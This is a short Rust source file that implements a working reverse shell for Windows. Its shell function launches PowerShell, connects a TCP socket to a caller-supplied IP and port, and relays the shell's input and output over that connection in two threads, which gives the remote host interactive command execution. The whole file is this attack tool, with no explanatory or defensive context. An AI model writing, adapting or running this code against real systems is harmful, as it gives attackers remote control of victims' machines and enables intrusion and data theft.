use std::fs::File;
use std::net::TcpStream;
use subprocess::{Popen, PopenConfig, Redirection};

pub fn shell(ip: String, port: String){
    let socket = [ip, port].join(":"); 
    let mut p = Popen::create(
        &["powershell"],
        PopenConfig {
            stdin: Redirection::Pipe,
            stdout: Redirection::Pipe,
            stderr: Redirection::Merge,
            ..Default::default()
        },
    )
    .expect("Failed to start shell.");

    let stdin: File = p.stdin.take().unwrap().into();
    let stdout_err: File = p.stdout.take().unwrap().into();
    let mut stream = TcpStream::connect(socket).unwrap();

    // continiously copy stdin to stream
    let t1 = pipe_thread(stdout_err, stream.try_clone().unwrap());
    // continiously copy stream output to stdout_err
    let t2 = pipe_thread(stream, stdin);
    t1.join();
    t2.join();
   
}

fn pipe_thread<R, W>(mut r: R, mut w: W) -> std::thread::JoinHandle<()>
where R: std::io::Read + Send + 'static,
      W: std::io::Write + Send + 'static
{
    std::thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            let len = r.read(&mut buffer).unwrap();
            if len == 0 {
                break;
            }
            w.write(&buffer[..len]).unwrap();
            w.flush().unwrap();
        }
    })
}